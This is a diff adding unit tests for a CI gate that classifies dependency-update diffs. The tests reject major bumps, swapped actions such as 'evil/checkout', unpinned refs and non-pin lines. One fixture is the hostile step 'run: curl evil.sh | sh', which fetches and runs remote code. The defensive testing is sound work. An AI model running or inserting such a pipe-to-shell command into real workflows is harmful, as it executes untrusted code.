@@ -231,5 +231,156 @@ class CycleChecks(unittest.TestCase):
         self.assertIsNone(v.baseline_warning(self.repo))
 
 
+PIN_OLD = "        uses: actions/checkout@" + "a" * 40 + " # v6.0.3"
+PIN_NEW = "        uses: actions/checkout@" + "b" * 40 + " # v6.1.0"
+PIN_MAJOR = "        uses: actions/checkout@" + "c" * 40 + " # v7.0.0"
+
+
+def fake_diff(*lines: str) -> str:
+    return "\n".join(
+        ["diff --git a/w.yml b/w.yml", "index 000..111 100644",
+         "--- a/w.yml", "+++ b/w.yml", "@@ -1 +1 @@", *lines]
+    )
+
+
+class DependencyClassifier(unittest.TestCase):
+    """Fail-closed classification of dependency-update diffs (T1 of cycle
+    2026-07-09-dep-update-tier). Rejection cases are pinned here on purpose:
+    widening them is a gate-softening change and must be deliberate."""
+
+    def test_manifests_by_exact_name(self):
+        for path in ("package-lock.json", "sub/dir/go.sum", "Cargo.lock",
+                     "requirements.txt", ".github/dependabot.yml"):
+            self.assertTrue(v.is_dep_manifest(P(path)), path)
+
+    def test_non_manifests_rejected(self):
+        for path in ("lib/validate.py", "package.json.bak", "dependabot.yml",
+                     "requirements.txt.in", "docs/go.sum.md"):
+            self.assertFalse(v.is_dep_manifest(P(path)), path)
+
+    def _pin_only(self, diff: str) -> v.Result:
+        with mock.patch.object(v, "run", return_value=diff):
+            return v.pin_only_workflow_diff("origin/main", P("w.yml"))
+
+    def test_pin_bump_same_major_accepted(self):
+        self.assertTrue(self._pin_only(fake_diff("-" + PIN_OLD, "+" + PIN_NEW)))
+
+    def test_major_bump_rejected(self):
+        r = self._pin_only(fake_diff("-" + PIN_OLD, "+" + PIN_MAJOR))
+        self.assertFalse(r)
+        self.assertIn("major", r.msg)
+
+    def test_swapped_action_rejected(self):
+        # Same pin shape, different action: the classic T1 bypass attempt.
+        evil = PIN_NEW.replace("actions/checkout", "evil/checkout")
+        r = self._pin_only(fake_diff("-" + PIN_OLD, "+" + evil))
+        self.assertFalse(r)
+        self.assertIn("new action", r.msg)
+
+    def test_new_action_without_counterpart_rejected(self):
+        self.assertFalse(self._pin_only(fake_diff("+" + PIN_NEW)))
+
+    def test_removed_action_without_counterpart_rejected(self):
+        # Deleting a single-line uses: step is a CI behavior change.
+        r = self._pin_only(fake_diff("-" + PIN_OLD))
+        self.assertFalse(r)
+        self.assertIn("removed", r.msg)
+
+    def test_unpinned_ref_rejected(self):
+        r = self._pin_only(fake_diff("-" + PIN_OLD, "+        uses: actions/checkout@v6 # v6.1.0"))
+        self.assertFalse(r)
+
+    def test_missing_version_comment_rejected(self):
+        bare = "+        uses: actions/checkout@" + "b" * 40
+        self.assertFalse(self._pin_only(fake_diff("-" + PIN_OLD, bare)))
+
+    def test_non_pin_line_rejected(self):
+        r = self._pin_only(fake_diff("-" + PIN_OLD, "+" + PIN_NEW, "+      - run: curl evil.sh | sh"))
+        self.assertFalse(r)
+        self.assertIn("non-pin", r.msg)
+
+    def test_removed_yaml_separator_is_not_mistaken_for_header(self):
+        # "-" + "---" must be treated as a (rejected) content change, not a
+        # diff file header.
+        self.assertFalse(self._pin_only(fake_diff("----", "+" + PIN_NEW)))
+
+    def test_reusable_workflow_and_subdir_paths_match(self):
+        line = "    uses: savioke/sdl/.github/workflows/x.yml@" + "d" * 40 + " # v1.2.0"
+        m = v.PIN_LINE_RE.match(line)
+        self.assertIsNotNone(m)
+        self.assertEqual(m.group("action"), "savioke/sdl")
+
+    def test_whole_diff_classification(self):
+        files = [P("package-lock.json"), P("docs/sdl/2026-07-09-x/dep-update.md")]
+        self.assertTrue(v.check_dep_class_diff("origin/main", files))
+        files.append(P("lib/validate.py"))
+        r = v.check_dep_class_diff("origin/main", files)
+        self.assertFalse(r)
+        self.assertIn("full cycle", r.msg)
+
+
+class DependencyRecord(unittest.TestCase):
+    """check_dep_record — the routine-tier evidence file."""
+
+    def setUp(self):
+        self._tmp = tempfile.TemporaryDirectory()
+        self.cycle = Path(self._tmp.name)
+
+    def tearDown(self):
+        self._tmp.cleanup()
+
+    def write_record(self, table_rows: str) -> None:
+        (self.cycle / "dep-update.md").write_text(
+            "# Dependency update record\n\nUpdates verified.\n\n"
+            "| package | from | to | source |\n|---|---|---|---|\n"
+            + table_rows, "utf-8"
+        )
+
+    def test_missing_record_fails(self):
+        self.assertFalse(v.check_dep_record(self.cycle, None))
+
+    def test_minor_bump_passes(self):
+        self.write_record("| actions/setup-python | v6.2.0 | v6.3.0 | dependabot |\n")
+        self.assertTrue(v.check_dep_record(self.cycle, None))
+
+    def test_major_bump_fails(self):
+        self.write_record("| actions/checkout | v6.0.3 | v7.0.0 | dependabot |\n")
+        r = v.check_dep_record(self.cycle, None)
+        self.assertFalse(r)
+        self.assertIn("major", r.msg)
+
+    def test_versions_without_v_prefix(self):
+        self.write_record("| lodash | 4.17.20 | 4.17.21 | dependabot |\n")
+        self.assertTrue(v.check_dep_record(self.cycle, None))
+
+    def test_unparseable_version_fails(self):
+        self.write_record("| mystery | old | new | hand |\n")
+        self.assertFalse(v.check_dep_record(self.cycle, None))
+
+    def test_empty_table_fails(self):
+        self.write_record("")
+        r = v.check_dep_record(self.cycle, None)
+        self.assertFalse(r)
+        self.assertIn("declares no updates", r.msg)
+
+
+class CycleClass(unittest.TestCase):
+    def setUp(self):
+        self._tmp = tempfile.TemporaryDirectory()
+        self.cycle = Path(self._tmp.name)
+
+    def tearDown(self):
+        self._tmp.cleanup()
+
+    def test_class_parsed(self):
+        (self.cycle / ".sdl-meta.yml").write_text(
+            "slug: s\nbranch: b\nclass: dependency-update\n", "utf-8")
+        self.assertEqual(v.cycle_class(self.cycle), "dependency-update")
+
+    def test_absent_class_is_none(self):
+        (self.cycle / ".sdl-meta.yml").write_text("slug: s\nbranch: b\n", "utf-8")
+        self.assertIsNone(v.cycle_class(self.cycle))
+
+
 if __name__ == "__main__":
     unittest.main()
